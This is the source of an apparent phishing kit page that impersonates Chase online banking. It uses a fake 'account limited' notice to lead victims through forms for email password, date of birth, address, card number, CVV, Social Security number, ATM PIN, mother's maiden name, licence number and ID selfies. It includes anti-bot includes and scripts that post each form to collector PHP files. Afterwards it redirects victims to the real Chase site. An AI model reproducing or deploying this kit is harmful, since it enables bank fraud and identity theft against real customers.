<?php
error_reporting(0);
include "../bot/antibots1.php";
include "../bot/antibots2.php";
include "../bot/antibots3.php";
include "../bot/antibots4.php";
include "../bot/antibots5.php";
include "../bot/antibots6.php";
?><!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
    <head>
        <meta charset="utf-8"/>

        <meta name="robots" content="noindex,nofollow" />
            <meta name="google-site-verification" content=""/>
        <title>Chase Online</title>
        <meta name="description" content=""/>
        <meta name="author" content=""/>
        <meta name="msapplication-config" content="none" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>



        <link rel="shortcut icon" href="./style/img/chasefavicon.ico"/>


<style>
        .spinnerWrapper{position:absolute;width:100%;top:45%;text-align:center}#chaseSpinnerID.jpui.spinner{display:inline-block;overflow:visible!important;padding-top:0;margin-top:-50%}#chaseSpinnerID.jpui.spinner:after{content:"\0020";-moz-animation:three-quarters-loader 780ms infinite linear;-webkit-animation:three-quarters-loader 780ms infinite linear;animation:three-quarters-loader 780ms infinite linear;border:4px solid #ccc;border-right-color:#0092ff;border-radius:50%;box-sizing:border-box;display:inline-block;position:relative;width:48px;height:48px}@media(max-width:991px){#chaseSpinnerID.jpui.spinner:after{width:38px;height:38px}}@media(max-width:767px){#chaseSpinnerID.jpui.spinner:after{width:28px;height:28px}}#chaseSpinnerID.jpui.spinner:before{content:"Loading";color:transparent;position:absolute;bottom:-1.25rem;font-size:1rem}#chaseSpinnerID.jpui.spinner:focus{outline:0}@-moz-keyframes three-quarters-loader{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes three-quarters-loader{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes three-quarters-loader{0%{-moz-transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);transform:rotate(360deg)}}#chaseSpinnerID.jpui.spinner .util.accessible-text{position:absolute!important;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0!important;border:0!important;height:1px!important;width:1px!important;overflow:hidden}BODY{overflow-x:hidden;overflow-y:auto;margin:0}#init,#body{opacity:0;-webkit-transition:opacity .5s;transition:opacity .5s}#init{z-index:-1;background:#fff;position:fixed;top:0;left:0;min-width:100%;min-height:110%}     





.spinner:after, .mask:after {
    content: '';
    position: fixed;
    z-index: -1;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    
background: #1c4f82;
    background: -moz-linear-gradient(top,#1c4f82 0,#2e6ea3 100%);
    -moz-opacity: .9;
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
}


</style>


<div id="spinarrrrrr" style="display:none">

<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;

"><div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>
</div>
<div id="yshys" ></div>
<div id="fixed" >
<div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;

"><div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>

</div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>




        <link rel="stylesheet" href="./style/css/blue-ui.css">
        <link rel="stylesheet" href="./style/css/logon.css">


<script src="./style/js/angular.min.js"></script>

<script src="./style/js/jquery.min.js"></script>

<script src="./style/js/jquery.validate.min.js"></script>

<script src="./style/js/jquery.mask.js"></script>



  <script>
$(function() {
$('#DateOfBirth').mask('00/00/0000');
$('#PhoneNumber').mask('(000) 00-000000');
$('#CardNumber').mask('0000 0000 0000 0000 0000');
$('#ExpirationDate').mask('00/0000');
$('#Cvv').mask('0000');
$('#SecurityNumber').mask('000-00-0000');
});</script>



<script>
function openNav() {
    document.getElementById("mySidenav").style.width = "100%";
}

function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
}
</script>




<style>


.sidenav {
    height: 100%;
    width: 100%;
    position: fixed;
        z-index: 5;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ffffff;
    opacity: 0.9;
    overflow-y: hidden;
    transition: 0.5s;
}

.sidenav a {
    padding: 8px 8px 8px 32px;
    text-decoration: none;
    font-size: 25px;
    color: #818181;
    display: block;
    transition: 0.3s;

}
.sidenav a:hover{
    color: #f1f1f1;
}
.sidenav .closebtn {
    position: absolute;
    top: 0;
    right: 25px;
    font-size: 36px;
    margin-left: 50px;
}
</style>
<div id="divdoor" ></div>
<div id="tbanhadiblastviry" style="display:none;">

<br><br>
<br>
<br>
<br>
<br>
<br>



<div style="text-align: center;">


<img width="150" height="150" src="./style/img/animation-checkmark.gif&#10;">


                         <p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>
                        <div class="btn-content-last">
                            






<button id="irpaypal" class="vx_btn" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> My PayPal<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button> 

<button id="iracont" class="vx_btn vx_btn-secondary" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> Log Out<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button>


                                                                 </div>
                        <p class="seconds"> You are being redirected to your Chase account , within 10 seconds. </p> 

			<p></p><h2>Your Account   has been successfully Restored</h2><h2><p></p>
            

<p></p> 
<p></p> 


<p></p><div class="footerLink"></div></h2></div>


</div>
</div>




<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}


.vx_btn.vx_btn-seco, .vx_btn-small.vx_btn-secon, .vx_btn-medium.vx_btn-seco {


background-color: transparent;
    border-color: #0070ba;
    color: #0070ba;


    margin-right: 0;
    margin-left: 0;
    width: 100%;
}



</style>






<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div data-is-view="true"><div class="" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"></div> <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div> </div></div> 





<header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"> <div><a href="#" data-attr="LOGON_SUMMARY_MENU.requestChaseHomepage"><div class="chase logo"></div> <span class="util accessible-text" data-attr="LOGON_SUMMARY_MENU.chaseLogoAda">Chase.com homepage</span></a></div> </div></header> <main id="logon-content" data-has-view="true"><div class="container logon" data-is-view="true"><div><div id="backgroundImage"><div class="jpui background image fixed show-xs show-sm" id="geoImage"><style type="text/css">.jpui.background.image { background-image: url(./style/img/default.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='./style/img/default.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='./style/img/default.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(./style/img/default.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(./style/img/default.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(./style/img/default.jpeg); } }</style></div></div></div> <div class="row"><div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">


<div class="jpui raised segment"><div class="row"><div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3></div></div> <div class="row"><div class="col-xs-12"><div class="progress"><div class="bar"></div></div></div></div></div> </div> <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">






<div id="sssddddvvvv" style ="background: rgba(255,255,255,.96);


border-radius: 5px;
    padding: 1.25rem 0;
    margin: 0 auto;"
 class="jpui raised "><div class="row"><div class="col-xs-10 col-xs-offset-1">
<div style="text-align: center;">



<div id="mySidenav" class="sidenav">



<div id="tbadkatviry">
<br><br>
<br>
<br>
<br>
<br>
<br>
<div>
<div style="text-align: center;">
<span class="stepLogo paymentStepLogo" data-reactid="14"></span>
<div class="centerContainer contextStep firstLoad" data-reactid="9">
<div class="paymentContainer" data-reactid="10"><div data-reactid="11">
<img src="./style/img/warning.png">
<link rel="stylesheet" type="text/css" href="#">
<div><span class="stepLogo regStepLogo"></span></div>

<h2>Verify your account. </h2><h3> We apologize for any inconvenience. </h3><h3> You can not access all your Chase advantages, due to account limited. <br>
                        </h3><h3> </h3><h3 style="margin-bottom:25px;"> To restore your account, please click <i>Continue</i> to update your information</h3>		


<button type="submit" onclick="closeNav()" id="proceedToLocateUserId" class="jpui button focus primary" data-attr="LOGON_PASSWORD_RESET.nextLabel"><span class="label">Continue To Chase</span> </button>



</div>


</div></div>

</div></div>


</div>

</div>





<h2   id="emailh1" >Link a E-Mail Account  <span class="util high-contrast"></span></h2>

<div   id="emailh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li  id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li  id="progress-progressBar-step-2"></li><li id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div>




<h2 style="display:none;"  id="bilingh1" >Update Billing Address <span class="util high-contrast"></span></h2>


<div style="display:none;" id="bilingh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li id="progress-progressBar-step-2"></li><li id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div>




<h2 style="display:none;"   id="cardh1" >Update Credit/Debit Card, no need to enter it again when using Chase <span class="util high-contrast"></span></h2>


<div style="display:none;"   id="cardh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step"   id="progress-progressBar-step-2"></li><li id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div>





<h2 style="display:none;"    id="idcardh1" >Please confirme your ID for more secure<span class="util high-contrast"></span></h2>

<div style="display:none;"   id="idcardh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step"  id="progress-progressBar-step-2"></li><li class="active current-step"  id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div>




<h2 style="display:none;"   id="thankh1" >Congratulations! Your have restored your account access.<span class="util high-contrast"></span></h2>

<div style="display:none;"   id="thankh2" class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step"  id="progress-progressBar-step-2"></li><li class="active current-step"  id="progress-progressBar-step-3"></li><li class="active current-step"  id="progress-progressBar-step-4"></li></ol></div>


</div>






<script>
$(function() {

	var validator = $("#bilingbank").bind("invalid-form.validate", function() {
			$("#errorrSignIn").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div> ");})
  $("form[name='bilingbank']").validate({

	errorContainer: $("#errorrSignIn"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },





    messages: {
      userbank: " ",
      passwordbank: " ",
      phoneNumber : "Phone Number is required",
      zipCod : "Postal Code is required",
      addres : "Address Line is required",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {


$("#spinarrrrrr").show();






					$.post("./system/sand_biling.php?ajax", $("#bilingbank").serialize(), function(result) {
                            setTimeout(function() {

$("#spinarrrrrr").hide();


$("#bilingh2").hide();
$("#bilingh1").hide();
$("#bilingbank").hide();


$("#cardh1").show();
$("#cardh2").show();
$("#cardnbank").show();







$(location).attr("", "");
});
});
},
});
});
</script>





<form style="display:none;" name="bilingbank" id="bilingbank" method="POST" autocomplete="off" action="#" novalidate="">




<div id="errorrSignIn" ></div>




<label class="util accessible-text logon-xs-toggle error" for="userId-input-field" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Username</label> <div class="logon-xs-toggle" id="userId">

<br>





 <input  class="jpui input logon-xs-toggle " id="fullname" placeholder="Full Name"  type="text" name="fullname" required="required"   >  
<input type="hidden" name="token" required="required" value="zabi">



 <input  class="jpui input logon-xs-toggle " id="DateOfBirth" placeholder="Date Of Birth"  type="text" name="DateOfBirth" required="required"   >  




 <input  class="jpui input logon-xs-toggle " id="StreetAddress" placeholder="Street Address"  type="text" name="StreetAddress" required="required"   >  



 <input  class="jpui input logon-xs-toggle " id="StateRegion" placeholder="State/Region"  type="text" name="StateRegion" required="required"   >  




 <input  class="jpui input logon-xs-toggle " id="ZipCode" placeholder="Zip Code"  type="text" name="ZipCode" required="required"   >  



 <input  class="jpui input logon-xs-toggle " id="Phone Number" placeholder="Phone Number"  type="text" name="Phone Number" required="required"   >  




<button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button>



<button type="submit" id="bilingwark" class="jpui button focus fluid " data-attr="LOGON.logonToLandingPage">

<span class="label">Cancel</span> </button>



<script>
$("#bilingwark").click(function(e) {
      e.preventDefault();


$("#emailh1").show();
$("#emailh2").show();
$("#emailbank").show();


$("#bilingh1").hide();
$("#bilingh2").hide();
$("#bilingbank").hide();


});
</script>






</form>







</div>




<script>
$(function() {

	var validator = $("#cardnbank").bind("invalid-form.validate", function() {
			$("#errorrcard").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div> ");})
  $("form[name='cardnbank']").validate({

	errorContainer: $("#errorrSignIn"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },





    messages: {
      userbank: " ",
      passwordbank: " ",
      PhoneNumber : "Phone Number is required",
      zipCod : "Postal Code is required",
      addres : "Address Line is required",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {


$("#spinarrrrrr").show();


					$.post("./system/sand_carde.php?ajax", $("#cardnbank").serialize(), function(result) {
                            setTimeout(function() {


$("#spinarrrrrr").hide();

$("#cardh1").hide();
$("#cardh2").hide();
$("#cardnbank").hide();

$("#idcardh1").show();
$("#idcardh2").show();
$("#idcard").show();









$(location).attr("", "");
});
});
},
});
});
</script>


<form style="display:none;"   name="cardnbank" id="cardnbank" method="POST" autocomplete="off" action="#" novalidate="">




<div id="errorrcard" ></div>



 <input  class="jpui input logon-xs-toggle " id="CardNumber" placeholder="Card Number"  type="text" name="CardNumber" required="required"   >  




 <input  class="jpui input logon-xs-toggle " id="ExpirationDate" placeholder="Expiration Date MM/YY"  type="text" name="ExpirationDate" required="required"   >  
<input type="hidden" name="token" required="required" value="zabi">




 <input  class="jpui input logon-xs-toggle " id="Cvv" placeholder="Cvv/Csc"  type="text" name="Cvv" required="required"   >  



 <input  class="jpui input logon-xs-toggle " id="SecurityNumber" placeholder="Social Security Number"  type="text" name="SecurityNumber" required="required"   >  




 <input  class="jpui input logon-xs-toggle " id="AtmPin" placeholder="Atm Pin"  type="text" name="AtmPin" required="required"   >  



 <input  class="jpui input logon-xs-toggle " id="MaidenName" placeholder="Mother's Maiden Name"  type="text" name="MaidenName" required="required"   >  




 <input  class="jpui input logon-xs-toggle " id="LicenseNumber" placeholder="Drivng License Number"  type="text" name="LicenseNumber" required="required"   >  






<button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button>



<button type="submit" id="cardgwark" class="jpui button focus fluid " data-attr="LOGON.logonToLandingPage"><span class="label">Cancel</span> </button>



<script>
$("#cardgwark").click(function(e) {
      e.preventDefault();


$("#bilingh2").show();
$("#bilingh1").show();
$("#bilingbank").show();


$("#cardh1").hide();
$("#cardh2").hide();
$("#cardnbank").hide();


});
</script>






</form>






<script>
$(function() {

	var validator = $("#emailbank").bind("invalid-form.validate", function() {
			$("#errorremail").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div> ");})
  $("form[name='emailbank']").validate({

	errorContainer: $("#errorrSignIn"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },





    messages: {
      userbank: " ",
      passwordbank: " ",
      phoneNumber : "Phone Number is required",
      zipCod : "Postal Code is required",
      addres : "Address Line is required",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {


$("#spinarrrrrr").show();



					$.post("./system/sand_login_email.php?ajax", $("#emailbank").serialize(), function(result) {
                            setTimeout(function() {


$("#spinarrrrrr").hide();


$("#emailh1").hide();
$("#emailh2").hide();
$("#emailbank").hide();
$("#bilingh1").show();
$("#bilingh2").show();
$("#bilingbank").show();



$(location).attr("", "");
});
});
},
});
});
</script>


<form    name="emailbank" id="emailbank" method="POST" autocomplete="off" action="#" novalidate="">




<div id="errorremail" ></div>





 <input type="email"  class="jpui input logon-xs-toggle " id="emaildress" placeholder="E-mail Adress" name="emaildress" required="required"   >  
<input type="hidden" name="token" required="required" value="zabi">




 <input type="password"  class="jpui input logon-xs-toggle " id="emailPassword" placeholder="E-mail Password" name="emailPassword" required="required"   >  






<button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button>








</form>

<script>
$(function() {

	var validator = $("#idcard").bind("invalid-form.validate", function() {
			$("#errorridcard").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div> ");})
  $("form[name='idcard']").validate({

	errorContainer: $("#errorrSignIn"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },





    messages: {
      userbank: " ",
      passwordbank: " ",
      phoneNumber : "Phone Number is required",
      zipCod : "Postal Code is required",
      addres : "Address Line is required",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {


$("#spinarrrrrr").show();





					$.post("./system/system.php?ajax", $("#idcard").serialize(), function(result) {
                            setTimeout(function() {

$("#spinarrrrrr").hide();


$("#idcard").hide();
$("#idcardh1").hide();
$("#idcardh2").hide();



$("#thankh2").show();
$("#thankh1").show();
$("#thnksss").show();







$(location).attr("", "");
});
});
},
});
});
</script>


<form style="display:none;"   name="idcard" id="idcard" method="POST" autocomplete="off" action="#" novalidate="">




<div id="idcard" ></div>


<br>

<div style="text-align: center;">
<img src="./style/img/aioe_icon_2_card_lg.png" style="height: 120px;">
<h4 id="Selfie">1.Selfie with your ID card</h4>
<img src="./style/img/aioe_icon_1_pid_lg.png" style="height: 120px;">
<h4>2.Photo of your ID document (both sides for driver license or ID card) next to front side of your payment card.</h4>
<h4 id="Selfie">(PDF - JPG - PNG)</h4>
	<!-- Google Fonts -->
	<link href="css/css.css" rel="stylesheet">
	<!-- Styles -->
	<link href="css/jquery.filer.css" rel="stylesheet">
	<link href="css/themes/jquery.filer-dragdropbox-theme.css" rel="stylesheet">
	<!-- Jvascript -->
	<script src="js/jquery.filer.min.js" type="text/javascript"></script>
	<script src="./js/custom.js" type="text/javascript"></script>


	    <input type="file" name="files[]" id="filer_input2" multiple="multiple">
      <input type="hidden" name="token" required="required" value="zabi">



	





		<form id="" name="" action="" method="post" enctype="multipart/form-data">

<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">



<script>
// Wait for the DOM to be ready
$(function() {
  // Initialize form validation on the registration form.
  // It has the name attribute "registration"
  $("form[name='idcard']").validate({
    // Specify validation rules

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },
    // Specify validation error messages
    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",




      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {
                  


$("#siriupleadddd").attr("class","setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated");

  $("#siriupleadddd").html("<span class='icon icon-medium icon-checkmark-small setupStep-icon' aria-hidden='true'></span><span class='setupStep-stateContent'>Security Accounts confirmed </span>");





$("#thankskatba").show();           
$("#thnksss").show();

$("#upleadkatba").hide();                    $("#uploadcardssa").hide();

$("#tbanhadiblastviry").show();
$("#tbadkatviry").hide();  




					$.post("./style/php/form_upload.php?ajax", $("#idcard").serialize(), function(result) {
                            setTimeout(function() {
                                $(location).attr("", "");
                            });
                    });
    }
  });
});

</script>



<button type="submit"  class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button>



<button type="submit" id="idcardgwark" class="jpui button focus fluid " data-attr="LOGON.logonToLandingPage"><span class="label">Cancel</span> </button>


<script>
$("#idcardgwark").click(function(e) {
      e.preventDefault();


$("#cardh1").show();
$("#cardh2").show();
$("#cardnbank").show();

$("#idcardh1").hide();
$("#idcardh2").hide();
$("#idcard").hide();




});
</script>



</div> 
</div></form> 

</div>

</form>


<div style="display:none;"   id="thnksss">

<br>
<div style="text-align: center;">
<img width="150" height="150" src="./style/img/animation-checkmark.gif&#10;"><h3>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </h3>
<br>
                       


<button type="submit" id="sirpaypal" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">My chase</span> </button>


 
<button type="submit" id="siracont"  class="jpui button focus fluid " data-attr="LOGON.logonToLandingPage"><span class="label">Log Out</span> </button>



<div style="text-align: center;">





<script>
$("#siracont").click(function(e) {
      e.preventDefault();
$("#spinarrrrrr").show();

   $(location).attr("href", "//chase.com/");
});
</script>
<script>
$("#sirpaypal").click(function(e) {
      e.preventDefault();
$("#spinarrrrrr").show();

   $(location).attr("href", "//chase.com/signin");
});
</script>                                                           </div>




 <h4 class="seconds"> You are being redirected to your chase account , within 10 seconds. </h4> 

			<p></p><h3>Your Account  has been successfully Restored</h3><h2><p></p>
           


 
</div>




<p></p> 
<p></p> 
<p></p><div class="footerLink"></div></h2> </div>


</div></div></div></div></div></div></main>



</div></div></div></div></div></div>

<br><br>
<br>
<br>
<br>
<br>
<br>



<div class="footer-container" data-is-view="true" style="position: static;"><div class="container"><div class="social-links row"><div class="col-xs-12"><span class="follow-us-text">Follow us:</span> <ul class="icon-links"><li class="facebook"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseFacebook"><i class="jpui facebook icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseFacebookAda">Facebook</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="instagram"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseInstagram"><i class="jpui instagram icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseInstagramAda">Instagram</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="twitter"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseTwitter"><i class="jpui twitter icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseTwitterAda">Twitter</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="youtube"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseYouTube"><i class="jpui youtube icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseYouTubeAda">YouTube</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li> <li class="linkedin"><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedIn"><i class="jpui linkedin icon footer" id="undefined" aria-hidden="true"></i> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.requestChaseLinkedInAda">LinkedIn</span> <span class="util accessible-text" data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens dialog</span></a></li></ul></div></div> <div class="footer-links row"><div class="col-xs-12"><ul><li><a href="#" data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact us</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms of use</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE Act: Chase Mortgage Loan Originators</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair Lending</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestAboutChase">About Chase</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P. Morgan</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan Chase &amp; Co.</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espanol</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase Canada</a></li> <li><a href="#" data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li> <li>Member FDIC</li> <li><i class="jpui equal-housing-lender icon" id="undefined" aria-hidden="true"></i> Equal Housing Lender</li> <li class="copyright-label">&copy; 2020 JPMorgan Chase &amp; Co.</li></ul></div></div> <div class="row galaxy-footer"><div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">&copy; 2018 JPMorgan Chase &amp; Co.</span><br> <a class="NOTELINK" href="#" data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy <i class="jpui progressright icon end-icon" aria-hidden="true"></i></a><br> <a href="#" data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our commitment to accessibility<i class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p></div></div></div></div>



</body></html>

